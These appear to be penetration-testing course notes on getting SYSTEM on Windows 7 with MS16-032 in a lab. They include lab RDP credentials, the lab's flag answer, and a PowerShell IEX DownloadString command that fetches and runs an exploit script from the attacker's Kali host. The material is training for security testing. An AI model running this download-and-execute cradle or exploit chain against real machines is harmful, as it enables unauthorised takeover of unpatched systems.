# Section 30 — Windows Desktop (Windows 7 Case Study)

> **Lab: yes** — RDP to Windows 7, enumerate missing patches, escalate to SYSTEM using MS16-032, read flag.

**Core principle:** Windows 7 is EOL (January 14, 2020) but still widely deployed in retail, healthcare, government, and education. Like Server 2008, it lacks modern protections and is typically vulnerable to the same kernel exploits. Same methodology: enumerate patches, pick an exploit, get SYSTEM.

---

## Windows 7 vs Windows 10 — missing security features

| Feature | Windows 7 | Windows 10 |
|---------|-----------|------------|
| Credential Guard | No | Yes |
| Device Guard | No | Yes |
| AppLocker | Partial | Yes |
| Windows Defender | Partial | Yes |
| Control Flow Guard | No | Yes |
| BitLocker | Partial | Yes |
| Remote Credential Guard | No | Yes |

---

## Enumeration with Windows-Exploit-Suggester

Alternative to Sherlock — runs on Kali against saved systeminfo output.

### Capture systeminfo on target

```cmd
systeminfo > C:\Users\htb-student\Desktop\sysinfo.txt
```
> Transfer this file to Kali.

### Update vulnerability database and run

```bash
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo sysinfo.txt
```
> Compares installed hotfixes against all known Microsoft bulletins. Filter out DoS exploits and focus on local privilege escalation entries marked `[E]` (ExploitDB PoC) or `[M]` (Metasploit module).

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-WIN7)
**RDP Creds:** `htb-student` / `HTB_@cademy_stdnt!`

### Attack chain

```
STEP 1: CONNECT
───────────────
1. RDP to target (rdesktop for Win7 TLS compat)
   rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <TARGET_IP>

STEP 2: ESCALATE WITH MS16-032
──────────────────────────────
2. On Kali, serve the exploit (if not already running)
   python3 -m http.server 8000 --directory /usr/share/powershell-empire/empire/server/data/module_source/privesc/

3. On target (PowerShell), download and run
   IEX(New-Object Net.WebClient).DownloadString('http://KALI_TUN0_IP:8000/Invoke-MS16032.ps1')
   Invoke-MS16-032 -Cmd "cmd /c type C:\Users\Administrator\Desktop\flag.txt > C:\Users\htb-student\Desktop\flag.txt"

4. Read the flag
   type C:\Users\htb-student\Desktop\flag.txt
   → Cm0n_l3ts_upgRade_t0_win10!
```

---

## Key takeaways

- **Windows 7 is identical to Server 2008 R2 from a privesc perspective.** Same kernel, same missing patches, same exploits (MS16-032, MS15-051, etc.).
- **MS16-032 is the go-to PowerShell privesc for legacy Windows.** Works on both Win7 and Server 2008 R2 x64.
- **Windows-Exploit-Suggester automates patch gap analysis.** Feed it systeminfo output and it maps missing patches to known exploits.
- **Context matters for reporting.** A law firm with one Win7 box = recommend upgrade. A retailer with 500 Win7 POS terminals = recommend segmentation + migration plan.
